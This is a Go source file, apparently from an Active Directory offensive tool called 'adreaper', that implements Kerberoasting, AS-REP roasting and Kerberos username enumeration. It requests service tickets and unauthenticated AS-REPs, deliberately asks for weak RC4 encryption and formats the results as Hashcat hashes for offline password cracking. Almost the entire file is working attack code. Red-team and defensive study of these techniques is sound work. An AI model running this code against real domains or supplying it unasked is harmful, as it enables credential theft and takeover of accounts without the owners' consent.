package recon

import (
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"

	krb5client "github.com/jcmturner/gokrb5/v8/client"
	krb5config "github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/iana/msgtype"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"

	"adreaper/internal/config"
)

// KerberosClient wraps gokrb5 for AD Kerberos operations.
type KerberosClient struct {
	client *krb5client.Client
	opts   *config.Options
}

// NewKerberosClient creates and authenticates a Kerberos client with password.
func NewKerberosClient(opts *config.Options) (*KerberosClient, error) {
	cfg, err := buildKrb5Config(opts)
	if err != nil {
		return nil, err
	}
	cl := krb5client.NewWithPassword(
		opts.Username,
		strings.ToUpper(opts.Domain),
		opts.Password,
		cfg,
		krb5client.DisablePAFXFAST(true),
	)
	if err := cl.Login(); err != nil {
		return nil, fmt.Errorf("kerberos login failed: %w", err)
	}
	return &KerberosClient{client: cl, opts: opts}, nil
}

// KerberoastHash returns a Hashcat-compatible $krb5tgs$23$ hash for the given SPN.
// The TGS encrypted part is extracted and formatted for offline cracking.
func (k *KerberosClient) KerberoastHash(username, spn string) (string, error) {
	tkt, _, err := k.client.GetServiceTicket(spn)
	if err != nil {
		return "", fmt.Errorf("TGS request for %s: %w", spn, err)
	}

	cipher := tkt.EncPart.Cipher
	if len(cipher) < 16 {
		return "", fmt.Errorf("cipher too short (%d bytes) for %s", len(cipher), spn)
	}
	// Hashcat format: $krb5tgs$<etype>$*<user>$<realm>$<spn>*$<first_16_bytes_hex>$<remaining_hex>
	etype := tkt.EncPart.EType
	first16 := fmt.Sprintf("%x", cipher[:16])
	rest := fmt.Sprintf("%x", cipher[16:])
	realm := strings.ToUpper(k.opts.Domain)

	return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
		etype, username, realm, spn, first16, rest), nil
}

// ASREPHash sends an unauthenticated AS-REQ for a user account and returns
// a Hashcat-compatible $krb5asrep$ hash ($krb5asrep$23$...).
func ASREPHash(opts *config.Options, username string) (string, error) {
	realm := strings.ToUpper(opts.Domain)

	cfg, err := buildKrb5Config(opts)
	if err != nil {
		return "", err
	}

	// 1. Build AS-REQ
	// CName (Client Name)
	cname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{username},
	}

	// SName (Service Name) - krbtgt/REALM
	sname := types.PrincipalName{
		NameType:   nametype.KRB_NT_SRV_INST,
		NameString: []string{"krbtgt", realm},
	}

	asReq, err := messages.NewASReq(realm, cfg, cname, sname)
	if err != nil {
		return "", fmt.Errorf("create AS-REQ: %w", err)
	}

	// Override etypes and nonce for the attack
	// We request RC4-HMAC (23) for easier cracking
	asReq.ReqBody.EType = []int32{etypeID.RC4_HMAC, etypeID.AES256_CTS_HMAC_SHA1_96, etypeID.AES128_CTS_HMAC_SHA1_96}
	asReq.ReqBody.Nonce = int(rand.Int31())
	asReq.ReqBody.Till = time.Now().UTC().Add(24 * time.Hour)

	b, err := asReq.Marshal()
	if err != nil {
		return "", fmt.Errorf("marshal AS-REQ: %w", err)
	}

	// 2. Send to KDC (TCP/88)
	// We use the KDC address from options
	kdcHost := opts.KDCAddr
	if kdcHost == "" {
		kdcHost = opts.DCIP
	}

	conn, err := net.DialTimeout("tcp", net.JoinHostPort(kdcHost, "88"), 5*time.Second)
	if err != nil {
		return "", fmt.Errorf("connect to KDC: %w", err)
	}
	defer conn.Close()

	// Kerberos over TCP requires a 4-byte length prefix
	lengthPrefixed := make([]byte, 4+len(b))
	lengthPrefixed[0] = byte(uint32(len(b)) >> 24)
	lengthPrefixed[1] = byte(uint32(len(b)) >> 16)
	lengthPrefixed[2] = byte(uint32(len(b)) >> 8)
	lengthPrefixed[3] = byte(uint32(len(b)))
	copy(lengthPrefixed[4:], b)

	if _, err := conn.Write(lengthPrefixed); err != nil {
		return "", fmt.Errorf("send AS-REQ: %w", err)
	}

	// 3. Read Response
	respSizeBuf := make([]byte, 4)
	if _, err := conn.Read(respSizeBuf); err != nil {
		return "", fmt.Errorf("read response size: %w", err)
	}
	respSize := uint32(respSizeBuf[0])<<24 | uint32(respSizeBuf[1])<<16 | uint32(respSizeBuf[2])<<8 | uint32(respSizeBuf[3])

	respBuf := make([]byte, respSize)
	if _, err := conn.Read(respBuf); err != nil {
		return "", fmt.Errorf("read response body: %w", err)
	}

	// 4. Parse Response
	var asRep messages.ASRep
	if err := asRep.Unmarshal(respBuf); err == nil && asRep.MsgType == msgtype.KRB_AS_REP {
		// EXTRACTION SUCCESS!
		etype := asRep.EncPart.EType
		cipherHex := hex.EncodeToString(asRep.EncPart.Cipher)

		if etype == etypeID.RC4_HMAC {
			// Hashcat 18200 format for etype 23: $krb5asrep$23$user$realm$checksum$cipher
			// Checksum is the first 16 bytes (32 hex chars)
			if len(cipherHex) > 32 {
				checksum := cipherHex[:32]
				encData := cipherHex[32:]
				return fmt.Sprintf("$krb5asrep$%d$%s$%s$%s$%s", etype, username, realm, checksum, encData), nil
			}
		}

		// For AES or other etypes, format as single blob
		return fmt.Sprintf("$krb5asrep$%d$%s$%s$%s", etype, username, realm, cipherHex), nil
	}

	// If not AS-REP, handle KRB-ERROR
	var krbErr messages.KRBError
	if err := krbErr.Unmarshal(respBuf); err != nil {
		return "", fmt.Errorf("unknown response from KDC (not AS-REP or KRB-ERROR)")
	}

	switch krbErr.ErrorCode {
	case 6: // KDC_ERR_C_PRINCIPAL_UNKNOWN
		return "", fmt.Errorf("account %s not found in KDC", username)
	case 25: // KDC_ERR_PREAUTH_REQUIRED
		return "", fmt.Errorf("account %s requires pre-auth — not vulnerable", username)
	default:
		return "", fmt.Errorf("KDC Error %d: %s", krbErr.ErrorCode, krbErr.EText)
	}
}

// EnumerateUsers tests username existence via Kerberos AS-REQ (unauthenticated).
// KDC_ERR_C_PRINCIPAL_UNKNOWN (6) = user not found
// KDC_ERR_PREAUTH_REQUIRED (25)   = user exists (requires pre-auth)
// AS-REP received                  = user exists with no pre-auth (AS-REP roastable)
func EnumerateUsers(opts *config.Options, usernames []string) (map[string]bool, error) {
	cfg, err := buildKrb5Config(opts)
	if err != nil {
		return nil, err
	}
	results := make(map[string]bool, len(usernames))
	for _, username := range usernames {
		cl := krb5client.NewWithPassword(username, strings.ToUpper(opts.Domain), "invalid_pass_X1@#",
			cfg, krb5client.DisablePAFXFAST(true))
		loginErr := cl.Login()
		cl.Destroy()

		if loginErr == nil {
			results[username] = true
			continue
		}
		errStr := strings.ToLower(loginErr.Error())
		// If error mentions pre-auth required → user exists
		if strings.Contains(errStr, "preauth") || strings.Contains(errStr, "kdc_err_preauth") {
			results[username] = true
		} else {
			// KDC_ERR_C_PRINCIPAL_UNKNOWN or other → user not found
			results[username] = false
		}
	}
	return results, nil
}

// Close destroys the Kerberos client credentials cache.
func (k *KerberosClient) Close() {
	if k.client != nil {
		k.client.Destroy()
	}
}

// buildKrb5Config generates a minimal in-memory krb5.conf for the target domain.
func buildKrb5Config(opts *config.Options) (*krb5config.Config, error) {
	realm := strings.ToUpper(opts.Domain)
	domain := strings.ToLower(opts.Domain)
	kdc := opts.KDCAddr
	if kdc == "" {
		kdc = opts.DCIP
	}

	// Use well-known etype names (RC4-HMAC for crackability, AES256 as fallback)
	cfgStr := fmt.Sprintf(`[libdefaults]
 default_realm = %s
 dns_lookup_realm = false
 dns_lookup_kdc = false
 ticket_lifetime = 24h
 forwardable = true
 default_tkt_enctypes = arcfour-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
 default_tgs_enctypes = arcfour-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96

[realms]
 %s = {
  kdc = %s:88
  admin_server = %s
 }

[domain_realm]
 .%s = %s
 %s = %s
`,
		realm,
		realm, kdc, kdc,
		domain, realm,
		domain, realm,
	)
	return krb5config.NewFromString(cfgStr)
}
